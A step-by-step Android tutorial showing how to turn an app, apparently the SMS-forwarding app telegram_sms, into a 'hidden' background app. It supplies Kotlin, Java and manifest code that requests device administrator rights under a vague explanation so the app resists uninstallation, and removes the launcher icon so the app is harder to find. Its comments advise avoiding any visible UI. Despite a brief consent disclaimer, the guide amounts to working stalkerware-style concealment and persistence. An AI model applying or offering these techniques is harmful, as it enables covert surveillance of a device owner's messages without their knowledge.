# Tutorial: Making Your Android App a "Hidden" Background App with Device Admin Privileges

This tutorial guides you through the process of modifying an existing Android application to operate more like a "hidden" background service. This involves:
1.  **Implementing Device Administration:** To prevent easy uninstallation and grant necessary permissions for robust background operation.
2.  **Removing the Launcher Icon:** To make the app less visible on the device after initial setup.

**Disclaimer:** Modifying apps to be "hidden" can have ethical implications. Ensure you have user consent and are complying with all relevant platform policies and legal regulations. This tutorial is for educational purposes only.

**Timestamp Convention:** Throughout this tutorial, code modifications will include a comment with a timestamp. For the purpose of this guide, we will use a consistent placeholder: `Modified at 11:00 AM UTC, October 26, 2023`.

## Part 1: Implementing Device Administration

Device Administration allows your app to enforce certain policies, such as preventing uninstallation.

### Step 1.1: Create the Device Admin Receiver XML (`device_admin_receiver.xml`)

This file defines the policies your device admin receiver can use.

1.  In Android Studio, navigate to `app/src/main/res/xml/`.
2.  Right-click on the `xml` directory and select `New > XML resource file`.
3.  Name the file `device_admin_receiver.xml`.
4.  Paste the following content into the file:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!-- Modified at 11:00 AM UTC, October 26, 2023 - Added device admin policies -->
<device-admin>
    <uses-policies />
</device-admin>
```

**Note:** The `<uses-policies />` tag means this admin receiver doesn't enforce specific policies like password rules or screen lock, but it's still useful for preventing uninstallation if the user tries to remove a device admin. For more specific policies (e.g., wipe data, force lock), you would add them within the `<uses-policies>` block.

### Step 1.2: Create the Device Admin Receiver Class (`MyDeviceAdminReceiver.kt`)

This class handles device admin events.

1.  In Android Studio, navigate to `app/src/main/java/com/yourpackage/yourappname/` (or your app's package name).
2.  Right-click on your package directory and select `New > Kotlin Class/File`.
3.  Name the file `MyDeviceAdminReceiver.kt`.
4.  Paste the following content into the file. Replace `com.qwe7002.telegram_sms` with your actual package name if different.

```kotlin
package com.qwe7002.telegram_sms // Replace with your actual package name

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
// import android.widget.Toast // Usually not needed for a "hidden" app

// Modified at 11:00 AM UTC, October 26, 2023 - Created DeviceAdminReceiver
class MyDeviceAdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Log.d("MyDeviceAdminReceiver", "Device admin enabled")
        // Toast.makeText(context, "Device Admin Enabled", Toast.LENGTH_SHORT).show() // Avoid UI for hidden apps
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        Log.d("MyDeviceAdminReceiver", "Device admin disabled")
        // Toast.makeText(context, "Device Admin Disabled", Toast.LENGTH_SHORT).show() // Avoid UI for hidden apps
    }
}
```

### Step 1.3: Declare the Receiver in `AndroidManifest.xml`

1.  Open `app/src/main/AndroidManifest.xml`.
2.  Add the following `<receiver>` declaration within the `<application>` tag, preferably towards the end:

```xml
<application
    ...>

    <!-- ... other activities and services ... -->

    <!-- Modified at 11:00 AM UTC, October 26, 2023 - Added MyDeviceAdminReceiver -->
    <receiver
        android:name=".MyDeviceAdminReceiver"  <!-- Use fully qualified name if in a sub-package -->
        android:description="@string/app_name" <!-- Or a more specific description -->
        android:label="@string/app_name"
        android:permission="android.permission.BIND_DEVICE_ADMIN"
        android:exported="true">
        <meta-data
            android:name="android.app.device_admin"
            android:resource="@xml/device_admin_receiver" />
        <intent-filter>
            <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
        </intent-filter>
    </receiver>
</application>
```

### Step 1.4: Add Code to Request Device Admin Privileges in `main_activity.java` (or your main activity)

You'll need to prompt the user to activate device administrator privileges for your app. This is typically done in your app's main activity or setup screen.

1.  Open your main activity file (e.g., `app/src/main/java/com/yourpackage/yourappname/main_activity.java`).
2.  Add the necessary imports:

```java
// ... other imports ...
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
// Modified at 11:00 AM UTC, October 26, 2023 - Added imports for Device Admin
```

3.  Define a request code constant within your activity class:

```java
public class main_activity extends AppCompatActivity {
    private static final int REQUEST_CODE_ENABLE_ADMIN = 101;
    // Modified at 11:00 AM UTC, October 26, 2023 - Added request code for Device Admin
    // ... rest of your class variables ...
```

4.  In your `onCreate` method (or a suitable place during app setup), add the logic to check for and request admin privileges:

```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    context = getApplicationContext(); // Ensure context is initialized

    // ... other onCreate setup ...

    // Modified at 11:00 AM UTC, October 26, 2023 - Added Device Admin activation request
    DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
    // Replace com.qwe7002.telegram_sms.MyDeviceAdminReceiver with your actual ComponentName
    ComponentName deviceAdminComponentName = new ComponentName(this, com.qwe7002.telegram_sms.MyDeviceAdminReceiver.class);

    if (devicePolicyManager != null && !devicePolicyManager.isAdminActive(deviceAdminComponentName)) {
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
            getString(R.string.device_admin_explanation)); // String resource defined next
        startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN); // No onActivityResult handling needed for this basic case
    }

    // ... rest of your onCreate method ...
}
```
**Important:** Ensure `com.qwe7002.telegram_sms.MyDeviceAdminReceiver.class` is replaced with the actual path to your `MyDeviceAdminReceiver` if it's different.

### Step 1.5: Add String Resource for Explanation

1.  Open `app/src/main/res/values/strings.xml` (or your primary strings XML file, e.g., `telegram_sms.xml`).
2.  Add the following string resource:

```xml
<resources>
    <!-- ... other strings ... -->
    <!-- Modified at 11:00 AM UTC, October 26, 2023 - Added device admin explanation string -->
    <string name="device_admin_explanation">Enable device admin to allow the app to operate reliably and prevent accidental uninstallation. This is required for the app\'s core background functionality.</string>
</resources>
```

At this point, when the app starts and device admin is not active, the user will be prompted to enable it.

## Part 2: Removing the Launcher Icon (Making the App "Hidden")

This step makes your app less visible by removing its icon from the app launcher. Users will typically open the app once for setup, and then it will run in the background.

**Caution:** Once the launcher icon is removed, users will not be able to open the app's main interface easily. Ensure all necessary permissions and settings are configured *before* this change is implemented, or provide an alternative way to access settings if needed (e.g., via a dialer code, which is not covered in this tutorial).

### Step 2.1: Modify `AndroidManifest.xml`

1.  Open `app/src/main/AndroidManifest.xml`.
2.  Locate the `<activity>` tag for your main launcher activity (the one containing the `android.intent.action.MAIN` and `android.intent.category.LAUNCHER` intent filter).
3.  Remove the entire `<intent-filter>` block that makes it a launcher activity.

**Before:**
```xml
        <activity
            android:name=".main_activity"
            android:windowSoftInputMode="adjustPan"
            android:exported="true"
            tools:ignore="Instantiatable,IntentFilterExportedReceiver">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
```

**After:**
```xml
        <!-- Modified at 11:00 AM UTC, October 26, 2023 - Removed LAUNCHER intent filter to hide app icon from launcher after setup. App settings should be configured before this version is deployed, or an alternative access method (not part of this task) would be needed. -->
        <activity
            android:name=".main_activity"
            android:windowSoftInputMode="adjustPan"
            android:exported="true"
            tools:ignore="Instantiatable,IntentFilterExportedReceiver">
            <!-- The LAUNCHER intent filter has been removed from here -->
        </activity>
```

### Step 2.2: Considerations for Background Operation

*   **Foreground Services:** If your app uses foreground services, their notifications will still be visible. This is a system requirement for user awareness of background tasks. Removing the launcher icon doesn't hide these notifications.
*   **Battery Optimizations:** Ensure your app requests `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` if it needs to run reliably in the background. This was likely already present in the original app.
*   **Boot Completion:** A `BootReceiver` (listening for `android.intent.action.BOOT_COMPLETED`) is essential to restart your app's services after the device reboots. This was also likely present.

## Conclusion

After following these steps:
1.  Your app will request Device Administrator privileges upon its first launch (or if not already active).
2.  Once these privileges are granted and the app is configured, subsequent launches of the app (if the version with the removed launcher icon is installed) will not show an icon in the app drawer, making it less obtrusive.

Remember to test thoroughly, especially the device admin activation and the app's behavior after the launcher icon is removed. Consider how users will manage settings or uninstall the app if needed (uninstalling a device admin app usually requires deactivating it from device settings first).
